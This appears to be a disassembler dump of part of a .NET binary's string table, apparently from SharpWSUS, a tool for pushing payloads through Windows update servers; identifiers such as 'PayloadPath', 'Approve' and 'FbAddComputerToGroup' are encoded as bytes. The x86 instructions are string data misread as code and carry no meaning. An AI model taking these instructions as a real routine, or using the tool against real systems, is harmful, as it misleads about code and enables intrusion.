  406336:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  40633a:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  406341:	62 
  406342:	75 74                	jne    0x4063b8
  406344:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  406349:	75 67                	jne    0x4063b2
  40634b:	67 61                	addr16 popa
  40634d:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  406351:	74 74                	je     0x4063c7
  406353:	72 69                	jb     0x4063be
  406355:	62 75 74             	bound  %esi,0x74(%ebp)
  406358:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40635d:	75 67                	jne    0x4063c6
  40635f:	67 65 72 42          	addr16 gs jb 0x4063a5
  406363:	72 6f                	jb     0x4063d4
  406365:	77 73                	ja     0x4063da
  406367:	61                   	popa
  406368:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  40636c:	74 74                	je     0x4063e2
  40636e:	72 69                	jb     0x4063d9
  406370:	62 75 74             	bound  %esi,0x74(%ebp)
  406373:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  406377:	6d                   	insl   (%dx),%es:(%edi)
  406378:	56                   	push   %esi
  406379:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  406380:	74 74                	je     0x4063f6
  406382:	72 69                	jb     0x4063ed
  406384:	62 75 74             	bound  %esi,0x74(%ebp)
  406387:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40638b:	73 65                	jae    0x4063f2
  40638d:	6d                   	insl   (%dx),%es:(%edi)
  40638e:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  406392:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  406399:	72 
  40639a:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  4063a1:	73 73                	jae    0x406416
  4063a3:	65 6d                	gs insl (%dx),%es:(%edi)
  4063a5:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  4063a9:	72 61                	jb     0x40640c
  4063ab:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  4063ae:	61                   	popa
  4063af:	72 6b                	jb     0x40641c
  4063b1:	41                   	inc    %ecx
  4063b2:	74 74                	je     0x406428
  4063b4:	72 69                	jb     0x40641f
  4063b6:	62 75 74             	bound  %esi,0x74(%ebp)
  4063b9:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  4063be:	67 65 74 46          	addr16 gs je 0x406408
  4063c2:	72 61                	jb     0x406425
  4063c4:	6d                   	insl   (%dx),%es:(%edi)
  4063c5:	65 77 6f             	gs ja  0x406437
  4063c8:	72 6b                	jb     0x406435
  4063ca:	41                   	inc    %ecx
  4063cb:	74 74                	je     0x406441
  4063cd:	72 69                	jb     0x406438
  4063cf:	62 75 74             	bound  %esi,0x74(%ebp)
  4063d2:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4063d6:	73 65                	jae    0x40643d
  4063d8:	6d                   	insl   (%dx),%es:(%edi)
  4063d9:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4063dd:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4063e4:	69 
  4063e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4063e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4063e7:	41                   	inc    %ecx
  4063e8:	74 74                	je     0x40645e
  4063ea:	72 69                	jb     0x406455
  4063ec:	62 75 74             	bound  %esi,0x74(%ebp)
  4063ef:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4063f3:	73 65                	jae    0x40645a
  4063f5:	6d                   	insl   (%dx),%es:(%edi)
  4063f6:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4063fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4063fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4063fc:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  406402:	74 69                	je     0x40646d
  406404:	6f                   	outsl  %ds:(%esi),(%dx)
  406405:	6e                   	outsb  %ds:(%esi),(%dx)
  406406:	41                   	inc    %ecx
  406407:	74 74                	je     0x40647d
  406409:	72 69                	jb     0x406474
  40640b:	62 75 74             	bound  %esi,0x74(%ebp)
  40640e:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406412:	73 65                	jae    0x406479
  406414:	6d                   	insl   (%dx),%es:(%edi)
  406415:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  406419:	65 73 63             	gs jae 0x40647f
  40641c:	72 69                	jb     0x406487
  40641e:	70 74                	jo     0x406494
  406420:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  406427:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  40642e:	6f                   	outsl  %ds:(%esi),(%dx)
  40642f:	6d                   	insl   (%dx),%es:(%edi)
  406430:	70 69                	jo     0x40649b
  406432:	6c                   	insb   (%dx),%es:(%edi)
  406433:	61                   	popa
  406434:	74 69                	je     0x40649f
  406436:	6f                   	outsl  %ds:(%esi),(%dx)
  406437:	6e                   	outsb  %ds:(%esi),(%dx)
  406438:	52                   	push   %edx
  406439:	65 6c                	gs insb (%dx),%es:(%edi)
  40643b:	61                   	popa
  40643c:	78 61                	js     0x40649f
  40643e:	74 69                	je     0x4064a9
  406440:	6f                   	outsl  %ds:(%esi),(%dx)
  406441:	6e                   	outsb  %ds:(%esi),(%dx)
  406442:	73 41                	jae    0x406485
  406444:	74 74                	je     0x4064ba
  406446:	72 69                	jb     0x4064b1
  406448:	62 75 74             	bound  %esi,0x74(%ebp)
  40644b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40644f:	73 65                	jae    0x4064b6
  406451:	6d                   	insl   (%dx),%es:(%edi)
  406452:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  406456:	72 6f                	jb     0x4064c7
  406458:	64 75 63             	fs jne 0x4064be
  40645b:	74 41                	je     0x40649e
  40645d:	74 74                	je     0x4064d3
  40645f:	72 69                	jb     0x4064ca
  406461:	62 75 74             	bound  %esi,0x74(%ebp)
  406464:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406468:	73 65                	jae    0x4064cf
  40646a:	6d                   	insl   (%dx),%es:(%edi)
  40646b:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40646f:	6f                   	outsl  %ds:(%esi),(%dx)
  406470:	70 79                	jo     0x4064eb
  406472:	72 69                	jb     0x4064dd
  406474:	67 68 74 41 74 74    	addr16 push $0x74744174
  40647a:	72 69                	jb     0x4064e5
  40647c:	62 75 74             	bound  %esi,0x74(%ebp)
  40647f:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  406483:	73 65                	jae    0x4064ea
  406485:	6d                   	insl   (%dx),%es:(%edi)
  406486:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40648a:	6f                   	outsl  %ds:(%esi),(%dx)
  40648b:	6d                   	insl   (%dx),%es:(%edi)
  40648c:	70 61                	jo     0x4064ef
  40648e:	6e                   	outsb  %ds:(%esi),(%dx)
  40648f:	79 41                	jns    0x4064d2
  406491:	74 74                	je     0x406507
  406493:	72 69                	jb     0x4064fe
  406495:	62 75 74             	bound  %esi,0x74(%ebp)
  406498:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40649c:	6e                   	outsb  %ds:(%esi),(%dx)
  40649d:	74 69                	je     0x406508
  40649f:	6d                   	insl   (%dx),%es:(%edi)
  4064a0:	65 43                	gs inc %ebx
  4064a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4064a3:	6d                   	insl   (%dx),%es:(%edi)
  4064a4:	70 61                	jo     0x406507
  4064a6:	74 69                	je     0x406511
  4064a8:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  4064ab:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  4064b2:	69 
  4064b3:	62 75 74             	bound  %esi,0x74(%ebp)
  4064b6:	65 00 4d 61          	add    %cl,%gs:0x61(%ebp)
  4064ba:	69 6e 45 78 65 63 75 	imul   $0x75636578,0x45(%esi),%ebp
  4064c1:	74 65                	je     0x406528
  4064c3:	00 47 65             	add    %al,0x65(%edi)
  4064c6:	74 56                	je     0x40651e
  4064c8:	61                   	popa
  4064c9:	6c                   	insb   (%dx),%es:(%edi)
  4064ca:	75 65                	jne    0x406531
  4064cc:	00 53 65             	add    %dl,0x65(%ebx)
  4064cf:	74 56                	je     0x406527
  4064d1:	61                   	popa
  4064d2:	6c                   	insb   (%dx),%es:(%edi)
  4064d3:	75 65                	jne    0x40653a
  4064d5:	00 51 75             	add    %dl,0x75(%ecx)
  4064d8:	65 72 79             	gs jb  0x406554
  4064db:	56                   	push   %esi
  4064dc:	61                   	popa
  4064dd:	6c                   	insb   (%dx),%es:(%edi)
  4064de:	75 65                	jne    0x406545
  4064e0:	00 52 65             	add    %dl,0x65(%edx)
  4064e3:	67 48                	addr16 dec %eax
  4064e5:	69 76 65 00 69 6e 48 	imul   $0x486e6900,0x65(%esi),%esi
  4064ec:	69 76 65 00 41 70 70 	imul   $0x70704100,0x65(%esi),%esi
  4064f3:	72 6f                	jb     0x406564
  4064f5:	76 65                	jbe    0x40655c
  4064f7:	00 53 68             	add    %dl,0x68(%ebx)
  4064fa:	61                   	popa
  4064fb:	72 70                	jb     0x40656d
  4064fd:	57                   	push   %edi
  4064fe:	53                   	push   %ebx
  4064ff:	55                   	push   %ebp
  406500:	53                   	push   %ebx
  406501:	2e 65 78 65          	cs js,pn 0x40656a
  406505:	00 6c 53 69          	add    %ch,0x69(%ebx,%edx,2)
  406509:	7a 65                	jp     0x406570
  40650b:	00 49 6e             	add    %cl,0x6e(%ecx)
  40650e:	64 65 78 4f          	fs gs js 0x406561
  406512:	66 00 52 65          	data16 add %dl,0x65(%edx)
  406516:	67 00 45 6e          	add    %al,0x6e(%di)
  40651a:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40651d:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  406524:	74 65                	je     0x40658b
  406526:	6d                   	insl   (%dx),%es:(%edi)
  406527:	2e 52                	cs push %edx
  406529:	75 6e                	jne    0x406599
  40652b:	74 69                	je     0x406596
  40652d:	6d                   	insl   (%dx),%es:(%edi)
  40652e:	65 2e 56             	gs cs push %esi
  406531:	65 72 73             	gs jb  0x4065a7
  406534:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  40653b:	54                   	push   %esp
  40653c:	6f                   	outsl  %ds:(%esi),(%dx)
  40653d:	42                   	inc    %edx
  40653e:	61                   	popa
  40653f:	73 65                	jae    0x4065a6
  406541:	36 34 53             	ss xor $0x53,%al
  406544:	74 72                	je     0x4065b8
  406546:	69 6e 67 00 52 65 76 	imul   $0x76655200,0x67(%esi),%ebp
  40654d:	65 72 73             	gs jb  0x4065c3
  406550:	65 53                	gs push %ebx
  406552:	74 72                	je     0x4065c6
  406554:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  40655b:	5f                   	pop    %edi
  40655c:	43                   	inc    %ebx
  40655d:	6f                   	outsl  %ds:(%esi),(%dx)
  40655e:	6e                   	outsb  %ds:(%esi),(%dx)
  40655f:	6e                   	outsb  %ds:(%esi),(%dx)
  406560:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406565:	6e                   	outsb  %ds:(%esi),(%dx)
  406566:	53                   	push   %ebx
  406567:	74 72                	je     0x4065db
  406569:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  406570:	65 41                	gs inc %ecx
  406572:	72 72                	jb     0x4065e6
  406574:	61                   	popa
  406575:	79 54                	jns    0x4065cb
  406577:	6f                   	outsl  %ds:(%esi),(%dx)
  406578:	53                   	push   %ebx
  406579:	74 72                	je     0x4065ed
  40657b:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  406582:	73 74                	jae    0x4065f8
  406584:	72 69                	jb     0x4065ef
  406586:	6e                   	outsb  %ds:(%esi),(%dx)
  406587:	67 00 55 70          	add    %dl,0x70(%di)
  40658b:	64 61                	fs popa
  40658d:	74 65                	je     0x4065f4
  40658f:	52                   	push   %edx
  406590:	61                   	popa
  406591:	74 69                	je     0x4065fc
  406593:	6e                   	outsb  %ds:(%esi),(%dx)
  406594:	67 00 44 65          	add    %al,0x65(%si)
  406598:	62 75 67             	bound  %esi,0x67(%ebp)
  40659b:	00 47 65             	add    %al,0x65(%edi)
  40659e:	74 42                	je     0x4065e2
  4065a0:	61                   	popa
  4065a1:	73 65                	jae    0x406608
  4065a3:	36 34 45             	ss xor $0x45,%al
  4065a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4065a7:	63 6f 64             	arpl   %ebp,0x64(%edi)
  4065aa:	65 64 53             	gs fs push %ebx
  4065ad:	48                   	dec    %eax
  4065ae:	41                   	inc    %ecx
  4065af:	31 48 61             	xor    %ecx,0x61(%eax)
  4065b2:	73 68                	jae    0x40661c
  4065b4:	00 47 65             	add    %al,0x65(%edi)
  4065b7:	74 42                	je     0x4065fb
  4065b9:	61                   	popa
  4065ba:	73 65                	jae    0x406621
  4065bc:	36 34 45             	ss xor $0x45,%al
  4065bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4065c0:	63 6f 64             	arpl   %ebp,0x64(%edi)
  4065c3:	65 64 53             	gs fs push %ebx
  4065c6:	48                   	dec    %eax
  4065c7:	41                   	inc    %ecx
  4065c8:	32 35 36 48 61 73    	xor    0x73614836,%dh
  4065ce:	68 00 43 6f 6d       	push   $0x6d6f4300
  4065d3:	70 75                	jo     0x40664a
  4065d5:	74 65                	je     0x40663c
  4065d7:	48                   	dec    %eax
  4065d8:	61                   	popa
  4065d9:	73 68                	jae    0x406643
  4065db:	00 50 61             	add    %dl,0x61(%eax)
  4065de:	79 6c                	jns    0x40664c
  4065e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4065e1:	61                   	popa
  4065e2:	64 50                	fs push %eax
  4065e4:	61                   	popa
  4065e5:	74 68                	je     0x40664f
  4065e7:	00 73 50             	add    %dh,0x50(%ebx)
  4065ea:	46                   	inc    %esi
  4065eb:	69 6c 65 50 61 74 68 	imul   $0x687461,0x50(%ebp,%eiz,2),%ebp
  4065f2:	00 
  4065f3:	73 46                	jae    0x40663b
  4065f5:	69 6c 65 50 61 74 68 	imul   $0x687461,0x50(%ebp,%eiz,2),%ebp
  4065fc:	00 
  4065fd:	67 65 74 5f          	addr16 gs je 0x406660
  406601:	4c                   	dec    %esp
  406602:	65 6e                	outsb  %gs:(%esi),(%dx)
  406604:	67 74 68             	addr16 je 0x40666f
  406607:	00 67 65             	add    %ah,0x65(%edi)
  40660a:	74 5f                	je     0x40666b
  40660c:	50                   	push   %eax
  40660d:	61                   	popa
  40660e:	72 73                	jb     0x406683
  406610:	65 64 4f             	gs fs dec %edi
  406613:	6b 00 70             	imul   $0x70,(%eax),%eax
  406616:	61                   	popa
  406617:	72 73                	jb     0x40668c
  406619:	65 64 4f             	gs fs dec %edi
  40661c:	6b 00 43             	imul   $0x43,(%eax),%eax
  40661f:	68 65 63 6b 00       	push   $0x6b6365
  406624:	43                   	inc    %ebx
  406625:	72 65                	jb     0x40668c
  406627:	61                   	popa
  406628:	74 65                	je     0x40668f
  40662a:	4c                   	dec    %esp
  40662b:	69 6e 6b 00 47 65 74 	imul   $0x74654700,0x6b(%esi),%ebp
  406632:	4f                   	dec    %edi
  406633:	72 64                	jb     0x406699
  406635:	69 6e 61 6c 00 41 64 	imul   $0x6441006c,0x61(%esi),%ebp
  40663c:	76 61                	jbe    0x40669f
  40663e:	70 69                	jo     0x4066a9
  406640:	33 32                	xor    (%edx),%esi
  406642:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  406645:	6c                   	insb   (%dx),%es:(%edi)
  406646:	00 61 64             	add    %ah,0x64(%ecx)
  406649:	76 61                	jbe    0x4066ac
  40664b:	70 69                	jo     0x4066b6
  40664d:	33 32                	xor    (%edx),%esi
  40664f:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  406652:	6c                   	insb   (%dx),%es:(%edi)
  406653:	00 46 69             	add    %al,0x69(%esi)
  406656:	6c                   	insb   (%dx),%es:(%edi)
  406657:	65 53                	gs push %ebx
  406659:	74 72                	je     0x4066cd
  40665b:	65 61                	gs popa
  40665d:	6d                   	insl   (%dx),%es:(%edi)
  40665e:	00 46 62             	add    %al,0x62(%esi)
  406661:	45                   	inc    %ebp
  406662:	6e                   	outsb  %ds:(%esi),(%dx)
  406663:	75 6d                	jne    0x4066d2
  406665:	44                   	inc    %esp
  406666:	6f                   	outsl  %ds:(%esi),(%dx)
  406667:	77 6e                	ja     0x4066d7
  406669:	53                   	push   %ebx
  40666a:	74 72                	je     0x4066de
  40666c:	65 61                	gs popa
  40666e:	6d                   	insl   (%dx),%es:(%edi)
  40666f:	00 50 72             	add    %dl,0x72(%eax)
  406672:	6f                   	outsl  %ds:(%esi),(%dx)
  406673:	67 72 61             	addr16 jb 0x4066d7
  406676:	6d                   	insl   (%dx),%es:(%edi)
  406677:	00 67 65             	add    %ah,0x65(%edi)
  40667a:	74 5f                	je     0x4066db
  40667c:	49                   	dec    %ecx
  40667d:	74 65                	je     0x4066e4
  40667f:	6d                   	insl   (%dx),%es:(%edi)
  406680:	00 73 65             	add    %dh,0x65(%ebx)
  406683:	74 5f                	je     0x4066e4
  406685:	49                   	dec    %ecx
  406686:	74 65                	je     0x4066ed
  406688:	6d                   	insl   (%dx),%es:(%edi)
  406689:	00 53 79             	add    %dl,0x79(%ebx)
  40668c:	73 74                	jae    0x406702
  40668e:	65 6d                	gs insl (%dx),%es:(%edi)
  406690:	00 48 61             	add    %cl,0x61(%eax)
  406693:	73 68                	jae    0x4066fd
  406695:	41                   	inc    %ecx
  406696:	6c                   	insb   (%dx),%es:(%edi)
  406697:	67 6f                	outsl  %ds:(%si),(%dx)
  406699:	72 69                	jb     0x406704
  40669b:	74 68                	je     0x406705
  40669d:	6d                   	insl   (%dx),%es:(%edi)
  40669e:	00 45 6e             	add    %al,0x6e(%ebp)
  4066a1:	75 6d                	jne    0x406710
  4066a3:	00 42 6f             	add    %al,0x6f(%edx)
  4066a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4066a7:	6c                   	insb   (%dx),%es:(%edi)
  4066a8:	65 61                	gs popa
  4066aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4066ab:	00 49 73             	add    %cl,0x73(%ecx)
  4066ae:	4c                   	dec    %esp
  4066af:	69 74 74 6c 65 45 6e 	imul   $0x646e4565,0x6c(%esp,%esi,2),%esi
  4066b6:	64 
  4066b7:	69 61 6e 00 4f 70 65 	imul   $0x65704f00,0x6e(%ecx),%esp
  4066be:	6e                   	outsb  %ds:(%esi),(%dx)
  4066bf:	00 4d 61             	add    %cl,0x61(%ebp)
  4066c2:	69 6e 00 46 62 44 65 	imul   $0x65446246,0x0(%esi),%ebp
  4066c9:	70 6c                	jo     0x406737
  4066cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4066cc:	79 6d                	jns    0x40673b
  4066ce:	65 6e                	outsb  %gs:(%esi),(%dx)
  4066d0:	74 52                	je     0x406724
  4066d2:	65 76 69             	gs jbe 0x40673e
  4066d5:	73 69                	jae    0x406740
  4066d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4066d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4066d9:	00 73 4c             	add    %dh,0x4c(%ebx)
  4066dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4066dd:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  4066e0:	43                   	inc    %ebx
  4066e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4066e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4066e3:	74 65                	je     0x40674a
  4066e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4066e6:	74 43                	je     0x40672b
  4066e8:	61                   	popa
  4066e9:	63 68 65             	arpl   %ebp,0x65(%eax)
  4066ec:	4c                   	dec    %esp
  4066ed:	6f                   	outsl  %ds:(%esi),(%dx)
  4066ee:	63 61 74             	arpl   %esp,0x74(%ecx)
  4066f1:	69 6f 6e 00 73 43 6f 	imul   $0x6f437300,0x6e(%edi),%ebp
  4066f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4066f9:	74 65                	je     0x406760
  4066fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4066fc:	74 4c                	je     0x40674a
  4066fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4066ff:	63 61 74             	arpl   %esp,0x74(%ecx)
  406702:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  406709:	74 65                	je     0x406770
  40670b:	6d                   	insl   (%dx),%es:(%edi)
  40670c:	2e 52                	cs push %edx
  40670e:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  406711:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406716:	6e                   	outsb  %ds:(%esi),(%dx)
  406717:	00 43 6f             	add    %al,0x6f(%ebx)
  40671a:	6d                   	insl   (%dx),%es:(%edi)
  40671b:	6d                   	insl   (%dx),%es:(%edi)
  40671c:	61                   	popa
  40671d:	6e                   	outsb  %ds:(%esi),(%dx)
  40671e:	64 43                	fs inc %ebx
  406720:	6f                   	outsl  %ds:(%esi),(%dx)
  406721:	6c                   	insb   (%dx),%es:(%edi)
  406722:	6c                   	insb   (%dx),%es:(%edi)
  406723:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406728:	6e                   	outsb  %ds:(%esi),(%dx)
  406729:	00 44 61 74          	add    %al,0x74(%ecx,%eiz,2)
  40672d:	61                   	popa
  40672e:	52                   	push   %edx
  40672f:	6f                   	outsl  %ds:(%esi),(%dx)
  406730:	77 43                	ja     0x406775
  406732:	6f                   	outsl  %ds:(%esi),(%dx)
  406733:	6c                   	insb   (%dx),%es:(%edi)
  406734:	6c                   	insb   (%dx),%es:(%edi)
  406735:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40673a:	6e                   	outsb  %ds:(%esi),(%dx)
  40673b:	00 73 65             	add    %dh,0x65(%ebx)
  40673e:	74 5f                	je     0x40679f
  406740:	43                   	inc    %ebx
  406741:	6f                   	outsl  %ds:(%esi),(%dx)
  406742:	6e                   	outsb  %ds:(%esi),(%dx)
  406743:	6e                   	outsb  %ds:(%esi),(%dx)
  406744:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406749:	6e                   	outsb  %ds:(%esi),(%dx)
  40674a:	00 44 62 43          	add    %al,0x43(%edx,%eiz,2)
  40674e:	6f                   	outsl  %ds:(%esi),(%dx)
  40674f:	6e                   	outsb  %ds:(%esi),(%dx)
  406750:	6e                   	outsb  %ds:(%esi),(%dx)
  406751:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406756:	6e                   	outsb  %ds:(%esi),(%dx)
  406757:	00 53 71             	add    %dl,0x71(%ebx)
  40675a:	6c                   	insb   (%dx),%es:(%edi)
  40675b:	43                   	inc    %ebx
  40675c:	6f                   	outsl  %ds:(%esi),(%dx)
  40675d:	6e                   	outsb  %ds:(%esi),(%dx)
  40675e:	6e                   	outsb  %ds:(%esi),(%dx)
  40675f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406764:	6e                   	outsb  %ds:(%esi),(%dx)
  406765:	00 46 73             	add    %al,0x73(%esi)
  406768:	71 6c                	jno    0x4067d6
  40676a:	43                   	inc    %ebx
  40676b:	6f                   	outsl  %ds:(%esi),(%dx)
  40676c:	6e                   	outsb  %ds:(%esi),(%dx)
  40676d:	6e                   	outsb  %ds:(%esi),(%dx)
  40676e:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  406773:	6e                   	outsb  %ds:(%esi),(%dx)
  406774:	00 45 78             	add    %al,0x78(%ebp)
  406777:	63 65 70             	arpl   %esp,0x70(%ebp)
  40677a:	74 69                	je     0x4067e5
  40677c:	6f                   	outsl  %ds:(%esi),(%dx)
  40677d:	6e                   	outsb  %ds:(%esi),(%dx)
  40677e:	00 55 70             	add    %dl,0x70(%ebp)
  406781:	64 61                	fs popa
  406783:	74 65                	je     0x4067ea
  406785:	44                   	inc    %esp
  406786:	65 73 63             	gs jae 0x4067ec
  406789:	72 69                	jb     0x4067f4
  40678b:	70 74                	jo     0x406801
  40678d:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  406794:	74 65                	je     0x4067fb
  406796:	6d                   	insl   (%dx),%es:(%edi)
  406797:	2e 44                	cs inc %esp
  406799:	61                   	popa
  40679a:	74 61                	je     0x4067fd
  40679c:	2e 43                	cs inc %ebx
  40679e:	6f                   	outsl  %ds:(%esi),(%dx)
  40679f:	6d                   	insl   (%dx),%es:(%edi)
  4067a0:	6d                   	insl   (%dx),%es:(%edi)
  4067a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4067a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4067a3:	00 73 71             	add    %dh,0x71(%ebx)
  4067a6:	6c                   	insb   (%dx),%es:(%edi)
  4067a7:	43                   	inc    %ebx
  4067a8:	6f                   	outsl  %ds:(%esi),(%dx)
  4067a9:	6d                   	insl   (%dx),%es:(%edi)
  4067aa:	6d                   	insl   (%dx),%es:(%edi)
  4067ab:	46                   	inc    %esi
  4067ac:	75 6e                	jne    0x40681c
  4067ae:	00 46 69             	add    %al,0x69(%esi)
  4067b1:	6c                   	insb   (%dx),%es:(%edi)
  4067b2:	65 49                	gs dec %ecx
  4067b4:	6e                   	outsb  %ds:(%esi),(%dx)
  4067b5:	66 6f                	outsw  %ds:(%esi),(%dx)
  4067b7:	00 53 68             	add    %dl,0x68(%ebx)
  4067ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4067bb:	77 4c                	ja     0x406809
  4067bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4067be:	67 6f                	outsl  %ds:(%si),(%dx)
  4067c0:	00 46 62             	add    %al,0x62(%esi)
  4067c3:	43                   	inc    %ebx
  4067c4:	72 65                	jb     0x40682b
  4067c6:	61                   	popa
  4067c7:	74 65                	je     0x40682e
  4067c9:	47                   	inc    %edi
  4067ca:	72 6f                	jb     0x40683b
  4067cc:	75 70                	jne    0x40683e
  4067ce:	00 46 62             	add    %al,0x62(%esi)
  4067d1:	52                   	push   %edx
  4067d2:	65 6d                	gs insl (%dx),%es:(%edi)
  4067d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4067d5:	76 65                	jbe    0x40683c
  4067d7:	47                   	inc    %edi
  4067d8:	72 6f                	jb     0x406849
  4067da:	75 70                	jne    0x40684c
  4067dc:	00 46 62             	add    %al,0x62(%esi)
  4067df:	52                   	push   %edx
  4067e0:	65 6d                	gs insl (%dx),%es:(%edi)
  4067e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4067e3:	76 65                	jbe    0x40684a
  4067e5:	43                   	inc    %ebx
  4067e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4067e7:	6d                   	insl   (%dx),%es:(%edi)
  4067e8:	70 75                	jo     0x40685f
  4067ea:	74 65                	je     0x406851
  4067ec:	72 46                	jb     0x406834
  4067ee:	72 6f                	jb     0x40685f
  4067f0:	6d                   	insl   (%dx),%es:(%edi)
  4067f1:	47                   	inc    %edi
  4067f2:	72 6f                	jb     0x406863
  4067f4:	75 70                	jne    0x406866
  4067f6:	00 46 62             	add    %al,0x62(%esi)
  4067f9:	41                   	inc    %ecx
  4067fa:	64 64 43             	fs fs inc %ebx
  4067fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4067fe:	6d                   	insl   (%dx),%es:(%edi)
  4067ff:	70 75                	jo     0x406876
  406801:	74 65                	je     0x406868
  406803:	72 54                	jb     0x406859
  406805:	6f                   	outsl  %ds:(%esi),(%dx)
  406806:	47                   	inc    %edi
  406807:	72 6f                	jb     0x406878
  406809:	75 70                	jne    0x40687b
  40680b:	00 67 54             	add    %ah,0x54(%edi)
  40680e:	61                   	popa
  40680f:	72 67                	jb     0x406878
  406811:	65 74 47             	gs je  0x40685b
  406814:	72 6f                	jb     0x406885
  406816:	75 70                	jne    0x406888
  406818:	00 43 68             	add    %al,0x68(%ebx)
  40681b:	61                   	popa
  40681c:	72 00                	jb     0x40681e
  40681e:	69 50 6f 72 74 4e 75 	imul   $0x754e7472,0x6f(%eax),%edx
  406825:	6d                   	insl   (%dx),%es:(%edi)
  406826:	62 65 72             	bound  %esp,0x72(%ebp)
  406829:	00 49 44             	add    %cl,0x44(%ecx)
  40682c:	61                   	popa
  40682d:	74 61                	je     0x406890
  40682f:	52                   	push   %edx
  406830:	65 61                	gs popa
  406832:	64 65 72 00          	fs gs jb 0x406836
  406836:	44                   	inc    %esp
  406837:	62 44 61 74          	bound  %eax,0x74(%ecx,%eiz,2)
  40683b:	61                   	popa
  40683c:	52                   	push   %edx
  40683d:	65 61                	gs popa
  40683f:	64 65 72 00          	fs gs jb 0x406843
  406843:	53                   	push   %ebx
  406844:	71 6c                	jno    0x4068b2
  406846:	44                   	inc    %esp
  406847:	61                   	popa
  406848:	74 61                	je     0x4068ab
  40684a:	52                   	push   %edx
  40684b:	65 61                	gs popa
  40684d:	64 65 72 00          	fs gs jb 0x406851
